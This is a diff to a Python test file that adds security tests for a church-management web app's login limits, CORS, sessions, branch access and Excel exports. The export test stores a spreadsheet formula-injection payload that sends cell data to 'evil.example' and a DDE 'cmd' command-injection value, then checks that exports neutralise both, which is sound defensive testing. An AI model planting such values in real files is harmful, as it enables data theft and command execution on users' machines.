@@ -159,17 +159,20 @@ def test_hq_secretary_sees_only_hq(client):
     assert {r["branch_id"] for r in bishop} == {1, 2}
 
 
-def test_account_locks_after_five_wrong_passwords(client):
+def test_account_locks_after_too_many_wrong_passwords(client):
     from datetime import timedelta
 
     from app.extensions import db
     from app.models import User, utcnow
 
     bad = {"email": "sec@t", "password": "wrong-password"}
-    for i in range(4):
-        r = client.post("/api/auth/login", json=bad)
-        assert r.status_code == 401 and f"{4 - i} attempt" in r.json["message"]
-    assert client.post("/api/auth/login", json=bad).status_code == 429
+    unknown = client.post("/api/auth/login", json={"email": "nobody@t", "password": "x"})
+    known = client.post("/api/auth/login", json=bad)
+    assert unknown.status_code == known.status_code == 401
+    assert unknown.json["message"] == known.json["message"] == "Email or password is incorrect."
+    for _ in range(18):
+        client.post("/api/auth/login", json=bad)
+    assert client.post("/api/auth/login", json=bad).status_code == 401
     right = client.post("/api/auth/login", json={"email": "sec@t", "password": "password-123"})
     assert right.status_code == 429 and "Try again" in right.json["message"]
     with client.application.app_context():
@@ -177,8 +180,6 @@ def test_account_locks_after_five_wrong_passwords(client):
         u.locked_until = utcnow() - timedelta(minutes=1)
         db.session.commit()
     assert client.post("/api/auth/login", json={"email": "sec@t", "password": "password-123"}).status_code == 200
-    r = client.post("/api/auth/login", json={"email": "nobody@t", "password": "x"})
-    assert r.status_code == 401 and r.json["message"] == "Email or password is incorrect."
 
 
 def test_security_headers(client):
@@ -186,6 +187,11 @@ def test_security_headers(client):
     assert r.headers["X-Content-Type-Options"] == "nosniff"
     assert r.headers["X-Frame-Options"] == "DENY"
     assert r.headers["Cache-Control"] == "no-store"
+    pre = {"Access-Control-Request-Method": "POST", "Access-Control-Request-Headers": "authorization,content-type"}
+    good = client.options("/api/auth/login", headers={"Origin": "http://localhost:5173", **pre})
+    assert good.headers.get("Access-Control-Allow-Origin") == "http://localhost:5173"
+    bad = client.options("/api/auth/login", headers={"Origin": "https://evil.example", **pre})
+    assert "Access-Control-Allow-Origin" not in bad.headers
 
 
 
@@ -323,3 +329,98 @@ def test_reports_download_as_excel(client):
     assert wb["Offering"]["A5"].value is not None
     assert client.get("/api/reports/download/nothing.xlsx", headers=sec).status_code == 404
     assert client.get("/api/reports/download/members.xlsx", headers=login(client, "cell@t")).status_code == 403
+
+
+def _limited_app():
+    from app import create_app
+    from app.config import TestConfig
+    from app.extensions import db
+
+    class Config(TestConfig):
+        RATELIMIT_ENABLED = True
+        TRUST_PROXY = True
+
+    app = create_app(Config)
+    with app.app_context():
+        db.create_all()
+        db.session.add(Branch(id=1, code="LAIM", name="HQ"))
+        for email in ("sec@t", "other@t"):
+            u = User(email=email, name=email, role="secretary", branch_id=1)
+            u.set_password("password-123")
+            db.session.add(u)
+        db.session.commit()
+    return app
+
+
+def test_wrong_passwords_block_that_device_only():
+    app = _limited_app()
+    c = app.test_client()
+    attacker = {"X-Forwarded-For": "41.90.1.1"}
+    office = {"X-Forwarded-For": "41.90.2.2"}
+    codes = [c.post("/api/auth/login", json={"email": "sec@t", "password": "guess"}, headers=attacker).status_code for _ in range(6)]
+    assert codes == [401] * 5 + [429]
+    blocked = c.post("/api/auth/login", json={"email": "sec@t", "password": "password-123"}, headers=attacker)
+    assert blocked.status_code == 429 and "15 minutes" in blocked.json["message"]
+    assert c.post("/api/auth/login", json={"email": "sec@t", "password": "password-123"}, headers=office).status_code == 200
+    assert c.post("/api/auth/login", json={"email": "other@t", "password": "password-123"}, headers=attacker).status_code == 200
+    flood = [c.post("/api/auth/login", json={"email": f"x{i}@t", "password": "x"}, headers={"X-Forwarded-For": "41.90.3.3"}).status_code for i in range(31)]
+    assert flood[-1] == 429 and flood.count(429) == 1
+
+
+def test_big_requests_are_refused(client):
+    r = client.post("/api/auth/login", data="x" * (1024 * 1024 + 10), content_type="application/json")
+    assert r.status_code == 413
+
+
+def test_logout_and_password_change_end_old_sessions(client):
+    first = client.post("/api/auth/login", json={"email": "sec@t", "password": "password-123"}).json
+    second = client.post("/api/auth/login", json={"email": "sec@t", "password": "password-123"}).json
+    h1 = {"Authorization": f"Bearer {first['access_token']}"}
+    assert client.post("/api/auth/logout", json={"refresh_token": first["refresh_token"]}, headers=h1).status_code == 200
+    assert client.get("/api/auth/me", headers=h1).status_code == 401
+    assert client.post("/api/auth/refresh", headers={"Authorization": f"Bearer {first['refresh_token']}"}).status_code == 401
+    import time
+
+    time.sleep(1.1)
+    h2 = {"Authorization": f"Bearer {second['access_token']}"}
+    changed = client.post("/api/auth/password", json={"current_password": "password-123", "new_password": "new-password-456"}, headers=h2)
+    assert changed.status_code == 200 and changed.json["access_token"]
+    assert client.get("/api/auth/me", headers=h2).status_code == 401
+    assert client.post("/api/auth/refresh", headers={"Authorization": f"Bearer {second['refresh_token']}"}).status_code == 401
+    assert client.get("/api/auth/me", headers={"Authorization": f"Bearer {changed.json['access_token']}"}).status_code == 200
+    assert client.post("/api/auth/refresh", headers={"Authorization": f"Bearer {changed.json['refresh_token']}"}).status_code == 200
+
+
+def test_secretary_cannot_reach_other_branch_members_through_side_doors(client):
+    with client.application.app_context():
+        from app.extensions import db
+
+        u = User(email="sec2@t", name="sec2", role="secretary", branch_id=2)
+        u.set_password("password-123")
+        db.session.add(u)
+        db.session.commit()
+    h = login(client, "sec2@t")
+    r = client.post("/api/leaders", json={"role": "Spy", "member_id": 1}, headers=h)
+    assert r.status_code == 422 and "name" not in r.json
+    assert client.post("/api/leaders", json={"role": "Bishop", "member_id": 3}, headers=h).status_code == 422
+    gift = client.post("/api/building-fund", json={"member_id": 2, "date": date.today().isoformat(), "amount": 100, "method": "cash"}, headers=h)
+    assert gift.status_code == 422 and "contributor" not in gift.json
+
+
+def test_excel_exports_never_run_formulas(client):
+    from io import BytesIO
+
+    from openpyxl import load_workbook
+
+    trap = '=HYPERLINK("http://evil.example/?x="&A1,"Click")'
+    r = client.post("/api/cell-reports", json={"date": date.today().isoformat(), "preacher": trap, "signed_by": "+cmd|' /C calc'!A0", "adults": []}, headers=login(client, "cell@t"))
+    assert r.status_code == 201
+    bishop = login(client, "bishop@t")
+    for kind in ("home-church-reports", "everything"):
+        wb = load_workbook(BytesIO(client.get(f"/api/reports/download/{kind}.xlsx", headers=bishop).data))
+        for ws in wb.worksheets:
+            for row in ws.iter_rows():
+                for cell in row:
+                    assert cell.data_type != "f", (ws.title, cell.coordinate, cell.value)
+        ws = wb["Home church reports"]
+        assert trap in [c.value for c in ws[5]]
